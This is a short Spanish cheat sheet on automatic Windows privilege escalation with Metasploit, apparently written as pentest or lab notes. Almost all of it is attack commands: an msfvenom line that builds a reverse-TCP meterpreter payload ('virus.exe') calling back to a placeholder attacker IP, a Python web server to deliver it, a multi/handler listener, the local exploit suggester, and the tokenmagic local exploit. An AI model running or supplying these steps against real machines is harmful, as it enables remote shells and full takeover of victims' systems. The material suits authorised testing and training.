# Escalada de Privilegios Automatica con Metasploit

Una vez obtenida una sesion de meterpreter, se pueden buscar exploits de escalada automaticamente.

## Generar Payload y Obtener Sesion

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f exe -o virus.exe
```

Servir el archivo:

```bash
python3 -m http.server 80
```


Configurar el handler:

```bash
msfconsole
use multi/handler
set LHOST <IP_atacante>
set LPORT <puerto>
set PAYLOAD <payload>
run
```

## Buscar Exploits de Escalada

```bash
background     #ctrl+Z
search local_exploit_suggester
show options
sessions -l
set SESSION 1
run
```

## Probar un Exploit Sugerido (ejemplo: tokenmagic)

```bash
use windows/local/tokenmagic
show options
set SESSION 1
set LHOST <IP_atacante>
set LPORT <puerto>
run
```

> Probar los exploits sugeridos uno a uno hasta que funcione.
